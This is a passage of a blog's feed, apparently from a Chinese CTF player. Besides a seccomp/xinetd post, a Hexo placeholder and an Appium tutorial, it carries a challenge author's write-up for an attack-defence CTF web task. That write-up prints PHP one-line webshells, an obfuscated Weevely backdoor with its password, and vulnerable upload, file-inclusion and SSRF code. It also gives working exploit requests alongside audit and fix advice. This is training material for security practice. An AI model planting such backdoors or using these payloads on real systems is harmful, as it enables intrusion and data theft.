    struct sock_filter *filter; /* Pointer to array of
                                    BPF instructions */
};

Each program must contain one or more BPF instructions:

struct sock_filter {            /* Filter block */
    __u16 code;                 /* Actual filter code */
    __u8  jt;                   /* Jump true */
    __u8  jf;                   /* Jump false */
    __u32 k;                    /* Generic multiuse field */
};

</code></pre>
<p>bpf规则实际上是在内核中的bpf虚拟机中运行，也就是说他也是一种opcode，因此，我们需要一些工具去生成相应的opcode。一个比较常用的工具是libseccomp，它可以通过一些接口来生成bpf规则代码。但使用libseccomp的话就需要自己写一个parser去调用相关的接口了。万幸，在调研中，我发现了谷歌的某个员工编写的<a href="https://github.com/google/kafel">kafel</a>库, 他可以很方便的将文本描述的过滤规则编译成sock_fprog结构体。</p>
<h1>0x02 修改：你到底改了点啥？</h1>
<p>在阅读了xinetd代码后，发现其代码结构是相当的干净易于理解的。我在其配置文件parser中添加了<code>kafel_rule</code> 这一选项，用于指定kafel规则文件。随后将文件编译为sock_fprog结构体保存在每个service的配置中。<br />
xinetd在接收到连接后会fork出来一个子进程，随后通过dup/dup2进行流重定向。在流重定向完成后，会调用execve执行目标服务程序。这一过程类似于在shell中执行程序并对流重定向，如果读者实现过简易的shell，应该很好理解。<br />
我们只需要在execve之前调用 <code>prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, args);</code> 便可对目标服务程序设定seccomp规则。</p>
<p>这一修改其实十分简单，代码的总变更行数不超过200行。</p>
<h1>0x03 效果：真管用？</h1>
<p>当然管用了，不信自己试试。</p>
<p>这个版本的xinetd我们已经应用到了战队布置pwn题使用的docker image：<a href="https://github.com/Asuri-Team/ctf-xinetd">ctf-xinetd</a>中。欢迎各位大师傅脱下来试用，好用的话别忘点个star~。</p>
<h1>0x04 目标：理想很丰满</h1>
<p>这个工具我用了不到六个小时就写完了。之所以这么赶时间，是希望在即将到来的国赛和以后的比赛中，能有主办方使用和推广这一工具，为选手提供更加干净公平的比赛环境。最终目的当然是国内外的所有比赛都能用上这一工具，但是理想很丰满，怕是到最后只有我们战队和比较熟悉的几个战队办比赛才会用吧233333。</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/12/03/hello-world/</id>
        <title><![CDATA[Hello World]]></title>
        <updated>2018-02-24T03:48:11+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/12/03/hello-world/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/12/03/hello-world/"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/</id>
        <title><![CDATA[XMan2017夏令营结业攻防赛Babyblog出题思路&WriteUP]]></title>
        <updated>2017-08-20T15:21:31+08:00</updated>
        <link href="https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/"/>
        <content type="text/html" src="https://www.summershrimp.com/2017/08/xman2017-awd-babyblog-writeup/"><![CDATA[<h1 class="md-end-block md-heading md-focus"><span class="md-expand">XMan 2017 AWD Babyblog author&#8217;s turtoral &amp; writeup</span></h1>
<h2 class="md-end-block md-heading">0x00 出题思路</h2>
<h3 class="md-end-block md-heading">常见一句话木马</h3>
<p><span class="md-line md-end-block">一句话木马是在日常攻击和渗透中使用的最广泛的一类木马，其具有代码量小，变形多，易隐藏等特性。这类一句话木马多为通过eval或类似命令直接执行对应语言的字符串代码，达到可以执行任意命令的效果。在本题中，我一共放置了四种不同类型的一句话木马：</span></p>
<pre class="lang:default decode:true"># 1. app/template/*.tpl
eval($_POST[passwd])

# 2. app/controllers/PostsController.php 
$_GET[function]($_POST[params])

# 3. bootstrap/autoload.php
echo `$_POST[shellcmd]`

# 4. app/views/errors/404.blade.php
@preg_replace("/[pageerror]/e", $_POST['passwd'], "saft");</pre>
<h3 class="md-end-block md-heading">常见大马</h3>
<p><span class="md-line md-end-block">相比于小马，这类木马通常体积稍大，更不易隐藏。但其中可以包含更多加密和混淆的措施，使攻击行为更不容易被察觉。在本题中，我放置了一个Weevely木马，其密码为xman1234</span></p>
<pre class="lang:default decode:true"># 1. autoload_real.php
$i='er";$K3i=$m[1][0K3].K3$m[1K3]K3[1];$hK3=$K3sl($ss(K3md5($i.$kh),0,K33));$f=$sl(K3$sK3s(md5($i.$';
$D='kfK3K3),0,3));$p="K3";foK3K3r(K3$K3z=1;$z&lt;count($m[1]);K3$z++)$pK3.=$q[$m[K32K3][K3K3$z]];if(sK';
$v='3LANK3GUAK3GE"];if($rr&amp;&amp;$ra)K3{$u=paK3rK3K3sK3K3e_url($rr);parse_str($uK3["query"],$qK3);$q=arK';
$B='[$i].=$p;$eK3=strpK3oK3s($s[$i]K3,$f);ifK3($eK3){$k=$khK3.K3$kf;oK3b_start();@evaK3l(@gzuncK3om';
$o='3;}}return K3$oK3;}$rK3=$_K3SERVER;$K3rr=@$r[K3"HTTP_REFEREK3R"];$ra=K3@$r["K3HTTP_AK3CCK3EPT_K';
$O='K3;iK3f($q&amp;K3&amp;$m){@sesK3sioK3n_start()K3;$s=K3&amp;$_SK3ESSIK3OK3N;$ss="substK3r";$sK3l="strtK3olow';
$H='3="";for($i=0;$i&lt;$l;K3){fK3orK3($j=0;($j&lt;$K3c&amp;&amp;$i&lt;$K3lK3)K3;$j++K3,$i++){$o.=$tK3{$i}^$k{$K3j}K';
$c='$K3ss($s[$i],0K3,$eK3))),$k))K3);$K3o=oK3b_get_conK3tentsK3();ob_enK3d_cK3lean();K3K3$d=baseK36';
$m='4_encode(x(K3gzcompK3ress($oK3),$kK3));print("&lt;K3$k&gt;$dK3K3&lt;/$k&gt;"K3);@sK3ession_deK3stroy();}}}}';
$t='$kh="a8bK3b";$K3kf="c44K3K3a";funK3ctK3ion x($t,$k){$cK3=sK3trlen($kK3);$l=stK3rlK3en($t);K3$oK';
$M='prK3ess(@x(@bK3aK3se64K3_decodeK3(pregK3_replaK3ce(aK3rray("/_/",K3"/-/"),arrK3ay(K3"/","K3+"),';
$f='3trposK3($p,$h)===0K3){$s[$i]=""K3;$p=$sK3s($pK3,3);}K3K3if(array_key_exisK3ts($i,K3$K3sK3)){$s';
$Q=str_replace('d','','crdddeatde_fdunctdion');
$b='3raK3y_vK3alues(K3$q)K3;preg_mK3aK3tch_all("K3/(K3[\\K3w])[\\w-]+(?:;q=0.([\\d]))K3?,K3?/",$ra,$m)';
$l=str_replace('K3','',$t.$H.$o.$v.$b.$O.$i.$D.$f.$B.$M.$c.$m);
$q=$Q('',$l);$q();</pre>
<p><span class="md-line md-end-block">在这段大马中，<span spellcheck="false"><code>$Q</code></span>和<span spellcheck="false"><code>$l</code></span>均为字符串。Weevely借助PHP可以将函数名字符串用作类似函数指针的特性，来构造木马。</span></p>
<pre class="lang:default decode:true">$Q = create_function

$kh = "a8bb";
$kf = "c44a";
function x($t, $k) {
	$c = strlen($k);
	$l = strlen($t);
	$o = "";
	for ($i = 0;$i &lt; $l;) {
		for ($j = 0;($j &lt; $c &amp;&amp; $i &lt; $l);$j++, $i++) {
			$o.= $t{$i} ^ $k{$j};
		}
	}
	return $o;
}
$r = $_SERVER;
$rr = @$r["HTTP_REFERER"];
$ra = @$r["HTTP_ACCEPT_LANGUAGE"];
if ($rr &amp;&amp; $ra) {
	$u = parse_url($rr);
	parse_str($u["query"], $q);
	$q = array_values($q);
	preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $ra, $m);
	if ($q &amp;&amp; $m) {
		@session_start();
		$s = &amp; $_SESSION;
		$ss = "substr";
		$sl = "strtolower";
		$i = $m[1][0] . $m[1][1];
		$h = $sl($ss(md5($i . $kh), 0, 3));
		$f = $sl($ss(md5($i . $kf), 0, 3));
		$p = "";
		for ($z = 1;$z$d");@session_destroy();}}}}
"</pre>
<h3 class="md-end-block md-heading">任意文件包含</h3>
<p><span class="md-line md-end-block">任意文件包含多为服务端程序在开发时没对可包含目录和文件做限制，导致可以读取任何文件。一般的表现形式为<span spellcheck="false"><code>http://localhost/page=index</code></span>或类似方式。本题中，我们在博客文章中引入了正文模板，这里的模板就具有文件包含漏洞。</span></p>
<pre class="lang:default decode:true"># 1. app/views/posts/show.blade.php
&lt;div class="article-body"&gt;
    {{ require __DIR__."/../../template/".$post-&gt;template }}
    {{ $post-&gt;body }}
&lt;/div&gt;</pre>
<h3 class="md-end-block md-heading">任意文件上传</h3>
<p><span class="md-line md-end-block">任意文件上传多为服务端程序在开发时，未对可上传文件的扩展名进行限制，导致可以上传服务器脚本，并通过HTTP访问执行。本题中，我们在博客文章图片上传处未对可上传文件做限制。</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
    public function uploadImage()
    {
        $data = [
            'success' =&gt; false,
            'msg' =&gt; 'Failed!',
            'file_path' =&gt; ''
        ];

        if ($file = Input::file('upload_file'))
        {
            $fileName        = $file-&gt;getClientOriginalName();
            $extension       = $file-&gt;getClientOriginalExtension() ?: 'png';
            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
            $destinationPath = public_path() . $folderName;
            $safeName        = str_random(10).'.'.$extension;
            $file-&gt;move($destinationPath, $safeName);
            $data['file_path'] = $folderName .'/'. $safeName;
            $data['msg'] = "Succeeded!";
            $data['success'] = true;
        }
        return $data;
    }</pre>
<h3 class="md-end-block md-heading">服务端请求伪造</h3>
<p><span class="md-line md-end-block">服务端请求伪造是指在开发过程中，有些用户提交的资源（如图片，文字等）需要加载到服务器本地进行处理，但服务端并未对资源地址进行限制，导致的可以探测服务器内网或任意本地文件读取。本题中，我们设计了/resolve_image这个调用，但是并没有制作相应的前端页面。</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
    public function resolveImage()
    {
        $resp = [
            'success' =&gt; false,
            'msg' =&gt; 'Failed!',
            'file_path' =&gt; ''
        ];

        $data = Input::only('resolve_file');

        $content = @file_get_contents($data['resolve_file']);
        if ($content)
        {
            $extension       = 'png';
            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
            $destinationPath = public_path() . $folderName;
            $safeName        = str_random(10).'.'.$extension;
            @mkdir($destinationPath, 0755, true);
            @file_put_contents($destinationPath .'/'. $safeName, $content);
            $resp['file_path'] = $folderName .'/'. $safeName;
            $resp['msg'] = "Succeeded!";
            $resp['success'] = true;
        }
        return $resp;
    }</pre>
<h2 class="md-end-block md-heading">0x01 审计与防御方式</h2>
<h3 class="md-end-block md-heading">常见一句话木马</h3>
<p><span class="md-line md-end-block">可以通过grep或find等命令搜索相关关键字（如<span spellcheck="false"><code>eval, system, passthru, $_POST, $_REQUEST</code></span>）等，来快速定位相关位置，随后对源码进行审查。这类木马通常不会影响程序运行逻辑，因此可以直接删除相关代码。</span></p>
<pre class="lang:default decode:true">$ grep -re eval
vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        $__result = eval($__input);
vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        eval($__hook);
app/template/3.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/1.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/2.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";

$grep -re \$_POST
bootstrap/compiled.php:        $request = self::createRequestFromFactory($_GET, $_POST, array(), $_COOKIE, $_FILES, $_SERVER);
bootstrap/compiled.php:        $_POST = $this-&gt;request-&gt;all();
bootstrap/compiled.php:        $request = array('g' =&gt; $_GET, 'p' =&gt; $_POST, 'c' =&gt; $_COOKIE);
bootstrap/autoload.php:echo `$_POST[checker]`;
public/packages/frozennode/administrator/js/ckeditor/samples/assets/posteddata.php:if (!empty($_POST))
...
app/views/errors/404.blade.php:@preg_replace("/[pageerror]/e", $_POST['notfound'], "saft");
app/storage/views/dde1e00e577ea930001955e78ec38ca4:@preg_replace("/[pageerror]/e", $_POST['notfound'], "saft");
app/template/3.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/1.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
app/template/2.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";</pre>
<h3 class="md-end-block md-heading">常见大马</h3>
<p><span class="md-line md-end-block">基本方法同小马，但由于大马结构复杂，更加需要平时的积累和人工分析能力。这类木马通常不会影响程序运行逻辑，因此可以直接删除相关代码或文件。</span></p>
<h3 class="md-end-block md-heading">任意文件包含</h3>
<p><span class="md-line md-end-block">可以通过grep或find等命令搜索相关关键字（如<span spellcheck="false"><code>include, require</code></span>）等，来快速定位相关位置，随后对源码进行审查。但因为这类关键词几乎在所有的代码文件中都存在，审查难度相对较大。但由于任意文件包含一般出现在业务逻辑内，与常用库的包含方式有所区别，有能力的团队可以开发一些审计工具，对其特征进行审计，也可以从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。</span></p>
<p><span class="md-line md-end-block">在本题中，容易发现系统自带的三个模板均以<span spellcheck="false"><code>[0-9]\.tpl</code></span>命名，因此在相关业务逻辑中，对提交的模板名称进行过滤即可。具体的位置如下。</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function store()
{
    $validator = Validator::make(Input::all(), Post::$rules);
    
    if ($validator-&gt;fails())
    {
        return Redirect::back()-&gt;withErrors($validator)-&gt;withInput();
    }
    $data = Input::only('title', 'body', 'category_id', 'template');
    $data['user_id'] = Auth::user()-&gt;id;
    $data['body'] = Purifier::clean($data['body'], 'ugc_body');
    
    $post = Post::create($data);
    $post-&gt;tag(Input::get('tags'));
    
    Flash::success(lang('Operation succeeded.'));
    return Redirect::route('posts.show', $post-&gt;id);
}
# 2. app/controllers/PostsController.php
public function update($id)
{
    $post = Post::findOrFail($id);
    $this-&gt;authorOrAdminPermissioinRequire($post-&gt;user_id);
    $validator = Validator::make($data = Input::all(), Post::$rules);
    if ($validator-&gt;fails())
    {
            return Redirect::back()-&gt;withErrors($validator)-&gt;withInput();
    }
    
    $data['body'] = Purifier::clean($data['body'], 'ugc_body');
    
    $post-&gt;update($data);
    $post-&gt;retag(Input::get('tags'));
    
    Flash::success(lang('Operation succeeded.'));
    return Redirect::route('posts.show', $post-&gt;id);
}</pre>
<p><span class="md-line md-end-block">在这两个函数中，对<span spellcheck="false"><code>$data['template']</code></span>提供的文件名进行正则匹配过滤即可。</span></p>
<h3 class="md-end-block md-heading">任意文件上传</h3>
<p><span class="md-line md-end-block">可以通过grep或find等命令搜索相关关键字（如<span spellcheck="false"><code>upload, $_FILES, move_uploaded_file, move</code></span>）等，来快速定位相关位置，随后对源码进行审查。这类漏洞一般比较容易进行审查，相关关键词即可大致定位可能出现问题的位置。由于这类函数用途很多，因此审计难度也相对较大。建议从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。</span></p>
<p><span class="md-line md-end-block">在本题中，容易发现博客文章图片上传功能未对文件类型进行过滤，我们需要修改相关代码，过滤掉可能导致上传木马文件的扩展名。</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function uploadImage()
{
    $data = [
        'success' =&gt; false,
        'msg' =&gt; 'Failed!',
        'file_path' =&gt; ''
    ];

    if ($file = Input::file('upload_file'))
    {
        $fileName        = $file-&gt;getClientOriginalName();
        $extension       = $file-&gt;getClientOriginalExtension() ?: 'png';
        $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
        $destinationPath = public_path() . $folderName;
        $safeName        = str_random(10).'.'.$extension;
        $file-&gt;move($destinationPath, $safeName);
        $data['file_path'] = $folderName .'/'. $safeName;
        $data['msg'] = "Succeeded!";
        $data['success'] = true;
    }
    return $data;
}</pre>
<p><span class="md-line md-end-block">这里可以简单的过滤<span spellcheck="false"><code>$safeName</code></span>中是否包含<span spellcheck="false"><code>'php'</code></span>等可作为脚本运行的文件扩展名字符串，发现问题直接返回错误即可。</span></p>
<h3 class="md-end-block md-heading">服务端请求伪造</h3>
<p><span class="md-line md-end-block">可以通过grep或find等命令搜索相关关键字（如file_get_content, curl）等，来快速定位相关位置，随后对源码进行审查。但由于这类函数用途很多，因此审计难度也相对较大。建议从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。</span></p>
<p><span class="md-line md-end-block">在本题中，此漏洞并不存在前端调用，因此只能对代码进行审计。可以发现在<span spellcheck="false"><code>/resolve_file</code></span>请求对应的处理函数中存在此类情况。</span></p>
<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
public function resolveImage()
{
    $resp = [
        'success' =&gt; false,
        'msg' =&gt; 'Failed!',
        'file_path' =&gt; ''
    ];

    $data = Input::only('resolve_file');

    $content = @file_get_contents($data['resolve_file']);
    if ($content)
    {
        $extension       = 'png';
        $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
        $destinationPath = public_path() . $folderName;
        $safeName        = str_random(10).'.'.$extension;
        @mkdir($destinationPath, 0755, true);
        @file_put_contents($destinationPath .'/'. $safeName, $content);
        $resp['file_path'] = $folderName .'/'. $safeName;
        $resp['msg'] = "Succeeded!";
        $resp['success'] = true;
    }
    return $resp;
}</pre>
<p><span class="md-line md-end-block">可以发现这里<span spellcheck="false"><code>file_get_contents</code></span>直接传入了请求参数，而未对其做过滤，因此可能导致任意文件读取。这里可以通过检查<span spellcheck="false"><code>$data['resolve_file']</code></span>的开头是否为<span spellcheck="false"><code>'http'</code></span>并且对<span spellcheck="false"><code>'localhost'</code></span>, <span spellcheck="false"><code>'127.*.*.*'</code></span>等相关的内网域名、IP等进行过滤。</span></p>
<h2 class="md-end-block md-heading">0x02 漏洞利用方式</h2>
<h3 class="md-end-block md-heading">1. index</h3>
<pre class="lang:default decode:true">GET http://localhost:21000/?method=assert HTTP/1.1
Host: localhost:21000
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Referer: system('cat /home/web/flag/flag')</pre>
<h3 class="md-end-block md-heading">2. 404</h3>
<pre class="lang:default decode:true">POST http://localhost:21000/asdadasdaasd HTTP/1.1
Host: localhost:21000
Content-Length: 27
Content-Type: application/x-www-form-urlencoded

notfound=system("cat%20%2Fhome%2Fweb%2Fflag%2Fflag")</pre>
<p><span class="md-line md-end-block">在比赛现场由于部署时使用了php7, preg_match的r选项已无法使用，因此该漏洞失效。</span></p>
<h3 class="md-end-block md-heading">3. upload_image</h3>
<pre class="lang:default decode:true">POST /upload_image</pre>
<p><span class="md-line md-end-block">直接上传一句话木马，随后通过一句话木马利用。</span></p>
<h3 class="md-end-block md-heading">4. weevely in autoload_real.php</h3>
<pre class="lang:default decode:true">$ weevely http://ip:port/any xman1234</pre>
<p><span class="md-line md-end-block">随后通过weevely直接读flag</span></p>
<h3 class="md-end-block md-heading">5. Post checker=shellcmd in autoload.php</h3>
<pre class="lang:default decode:true">POST http://localhost:21000/ HTTP/1.1
Host: localhost:21000
Content-Length: 41
Content-Type: application/x-www-form-urlencoded

checker=cat%20%2Fhome%2Fweb%2Fflag%2Fflag</pre>
<h3 class="md-end-block md-heading">6. template any file require</h3>
<p><span class="md-line md-end-block"><span spellcheck="false"><code>http://localhost:21000/posts/create</code></span>在发布文章时修改提交的模板值</span></p>
<pre class="lang:default decode:true">html
&lt;div class="form-group"&gt;
    &lt;select class="form-control" name="template"&gt;
    &lt;option value="/../../../../../../home/web/flag/flag"&gt;Template 1&lt;/option&gt;
    &lt;option value="2.tpl"&gt;Template 2&lt;/option&gt;
    &lt;option value="3.tpl"&gt;Template 3&lt;/option&gt;&lt;/select&gt;
&lt;/div&gt;</pre>
<p><span class="md-line md-end-block">随后新发布的文章中就会包含flag的值</span></p>
<h3 class="md-end-block md-heading">7. resolve_file SSRF</h3>
<pre class="lang:default decode:true">POST http://localhost:21000/resolve_image HTTP/1.1
Host: localhost:21000
Content-Length: 112
Content-Type: application/x-www-form-urlencoded
Cookie: laravel_session=eyJpdiI6ImN0alBVaUVmSWhDKzlpVXhybGVPZXc9PSIsInZhbHVlIjoianU3Ym9CcXFOeVN4bW5nS0k2MWxcL25Ed0FBN2s5VFg5SFlxRGl5eW12b1J4bkpSTFl3QzR3d0l4bUtvTzhMNklEQndEdlRDMVF0UmtSTllnVlNOaUR3PT0iLCJtYWMiOiJjNWNiNmMyODNjYmU1MGUyYTE0OWY0ZTMxMGQ4ZTRmM2Q2MDRhMDBjOWJmNTU4MGJjMDY1NGRkNzdjNDJhYjYwIn0%3D

resolve_file=php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D../../../../../../home/web/flag/flag</pre>
<p><span class="md-line md-end-block"><span class="">随后根据返回的json文件中file_path的值下载文件后base64解码即为flag</span></span></p>
<p>&nbsp;</p>
<h2>0x03 总结</h2>
<p>这次出题难度属于较为简单的，考察的也是最基础的一些常见web注入点。但由于时间关系和比赛性质，没有对XSS，CSRF，SQL注入等知识点进行考察，且所有的漏洞点均为可直接利用，没有需要二次利用的漏洞。以后可能会尝试出一些和密码学/misc/pwn相结合的web攻防题。最后也恭喜在这次夏令营中取得优异成绩的各位大师傅！</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2016/08/appium-android-ui-test/</id>
        <title><![CDATA[Appium在Android UI测试中的应用]]></title>
        <updated>2016-08-18T15:29:08+08:00</updated>
        <link href="https://www.summershrimp.com/2016/08/appium-android-ui-test/"/>
        <content type="text/html" src="https://www.summershrimp.com/2016/08/appium-android-ui-test/"><![CDATA[<h2>Android测试工具与Appium简介</h2>
<p>Appium是一个C/S架构的，支持Android/iOS Native, Hybrid 和 Mobile Web Apps的测试框架，与测试程序通过Selenum Webdriver协议通讯。Webdriver的好处是通过HTTP RPC的方式调用Server上的过程，编写测试脚本不受语言的限制，无论是Python, Java, NodeJS均可以方便的编写测试。本文中将使用Python进行编程。</p>
<p>起因是因为市场部的同事抛来如下需求：批量添加一些微信好友。直接抓取请求进行重放的方法是不靠谱的，微信与服务端的通讯均加密，Pass。考虑使用xposed等框架hook相关函数进行操作。但是xposed需要越狱，且开发复杂，Pass。后来想到了使用UI测试工具进行模拟操作，开发较为简单。</p>
<p>Android UI测试工具有很多种，如Monkey, UIAutomator, Selendroid, Robotium等。其中UIAutomator, Monkey, Selendroid均为非侵入式的UI测试，也就是不需要修改源代码，只要安装了目标程序就可以进行测试。Robotium需要与源码一同编译测试。Appium实际上就是一个测试工具的统一调度软件，将不同的非侵入式测试工具整合在一起，对外提供统一的API。在Android 2.3以前的版本，Appium会调用Selendroid，之后的版本会直接使用UIAutomator，iOS下使用UIAutomation。Appium还支持FirefoxOS的UI测试。</p>
<figure style="width: 347px" class="wp-caption alignnone"><img class="" src="https://dn-summershrimp-my-blog.qbox.me/appium.gif" width="347" height="614" /><figcaption class="wp-caption-text">Appium Gif</figcaption></figure>
<h2>安装Appium</h2>
<p>官网给出了命令行下的安装方法。但实际上Appium有GUI版本，更适合在Windows/MacOS下使用。Windows下需要安装.NET Framework。</p>
<pre class="lang:default decode:true">&gt; brew install node      # get node.js
&gt; npm install -g appium  # get appium
&gt; npm install wd         # get appium client
&gt; appium &amp;               # start appium
&gt; node your-appium-test.js</pre>
<p>Appium需要依赖Android SDK编译在手机端运行的两个插件，因此需要首先安装相应的Android SDK版本。这里直接使用了Android Studio中自带的SDK Manager。在SDKManager中选择和测试机相对应的SDK Platform和较新的Build-tools，如果需要使用模拟器测试还要装对应的ARM/x86 System Image，以及Intel HAXM Installer，用于加速x86虚拟机。Appium使用adb来与目标机器通讯，因此对于真机和模拟器操作几乎都是相同的，如何建立模拟器在此不再赘述。</p>
<p>安装完成后需要在Appium GUI中配置Android SDK目录，随后选择Android，点击Launch就可以启动Appium Server。</p>
<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk.png"><img class="alignnone size-medium wp-image-102" src="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-280x300.png" alt="Appium-android-sdk" width="280" height="300" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-280x300.png 280w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-768x823.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-956x1024.png 956w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk.png 1333w" sizes="(max-width: 280px) 100vw, 280px" /></a><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch.png"><img class="alignnone size-medium wp-image-103" src="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-300x263.png" alt="Appium-launch" width="300" height="263" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-300x263.png 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-768x672.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-1024x896.png 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch.png 1332w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>Appium Server默认会监听http://localhost:4723 ，用于RPC通讯。下面我们就可以打开熟悉的编程环境，编写UI测试用例了。这里使用Python进行编写，需要先安装Appium的Python Client  ，然后再python中使用appium.webclient就可以连接Appium server了。</p>
<pre class="lang:default decode:true">pip install Appium-Python-Client</pre>
<h2>使用Appium进行UI控制</h2>
<p>根据注释修改相应属性后即可运行测试。手机需要打开ADB调试，执行完以下代码后，Appium会在手机上安装Appium Settings和Unlock两个程序，随后微信会被启动。</p>
<pre class="lang:python decode:true">from appium import webdriver

desired_caps = {}
desired_caps['platformName'] = 'Android'  #测试平台
desired_caps['platformVersion'] = '5.1'   #平台版本
desired_caps['deviceName'] = 'm3_note'    #设备名称，多设备时需区分
desired_caps['appPackage'] = 'com.tencent.mm'  #app package名
desired_caps['appActivity'] = '.ui.LauncherUI' #app默认Activity
dr = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) #启动Remote RPC
</pre>
<p>Selenum Webdriver使用了一种类似于JS中的DOM模型的方法来选择页面中的元素。dr为当前正在活动的activity对象，可以使用findElementByXXX的方法来获取Activity中的元素。所有Element后带s的函数，均获得所有匹配的元素，不带s的函数获得第一个匹配的元素。</p>
<h3>查询函数</h3>
<h4>1. findElement(s)ByName</h4>
<p>在Android中基本没用。Android UI没有Name这个属性。有说可以使用text值获取。但我并没有成功</p>
<h4>2. findElement(s)ByClassName</h4>
<p>通过类名来获取元素，用法如下：</p>
<pre class="lang:python decode:true ">item_list = dr.find_elements_by_class_name("android.widget.LinearLayout")
item_list[2].click()</pre>
<h4>3. findElementById</h4>
<p>通过resource_id来获取元素，每个Activity中都是唯一的，用法如下</p>
<pre class="lang:python decode:true">t = dr.find_element_by_id("com.tencent.mm:id/f7")
t.send_keys(wechatId)</pre>
<h4>4. findElement(s)ByAccessbiltiyId</h4>
<p>在Android上AccessbilityID实际就是contentDescription。这个属性是为了方便视力受损人士使用手机所设置。开启TTS后系统会朗读相关控件的contentDescription。</p>
<h4>5. findElement(s)ByXPath</h4>
<p>通过XML Path描述来寻找元素。我没有成功的获取到，可能是XPath写的有问题。</p>
<pre class="lang:python decode:true">s = dr.find_element_by_xpath("//android.widget.TextView[contains(@text,'搜索')]")
s.click()</pre>
<h4>6. findElementByAndroidUIAutomator</h4>
